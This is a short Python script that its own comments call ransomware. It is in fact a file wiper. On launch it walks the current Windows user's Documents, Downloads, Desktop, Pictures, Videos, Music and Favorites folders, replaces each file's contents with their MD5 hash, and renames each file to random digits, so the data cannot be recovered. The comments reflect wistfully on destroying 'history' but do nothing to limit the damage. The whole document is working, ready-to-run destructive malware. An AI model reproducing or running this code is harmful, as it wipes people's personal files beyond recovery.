from hashlib import md5
from random import randint
from sys import argv
import os


# The archbishop of the bizarre-aspect gluttony doesn't care what he eats, only the quantity
# This ransomware encrypt files with MD5 and rename then with random numeric sequences

# <Warning> It's not possible recover files encrypted with MD5
# Once executed, this malware will devour everything it finds, leaving only a empty carcass.
# Having your name and information devoured, the file will eventually be forgotten

# Getting information is smarter than destroying it, but it all depends on your context
# I programmed this sad, the feel is like developing a nuclear bomb
# I found old files that brought me nostalgia while programming this
# Is the type of thing that this script devour, deleting a part of history
# Think if this is really the best option for you


def devour(forgetting_list, eat_name=True):
    for path in forgetting_list:
        os.chdir(path)
        for folders, sub_folders, files in os.walk('.'):
            for file in files:
                if file != os.path.basename(argv[0]):  # Anti self-cannibalism
                    print(f'Trashing: {file}')
                    open(file, 'w').write(md5(open(file, 'rb').read()).hexdigest())  # Hashing
                    if eat_name:  # Renaming
                        zero_name = []
                        for n in range(0, 8):
                            zero_name.append(str(randint(0, 9)))
                        os.rename(file, ''.join(zero_name))


devour([
    fr'C:\Users\{os.getlogin()}\Documents',
    fr'C:\Users\{os.getlogin()}\Downloads',
    fr'C:\Users\{os.getlogin()}\Desktop',
    fr'C:\Users\{os.getlogin()}\Pictures',
    fr'C:\Users\{os.getlogin()}\Videos',
    fr'C:\Users\{os.getlogin()}\Music',
    fr'C:\Users\{os.getlogin()}\Favorites',
])




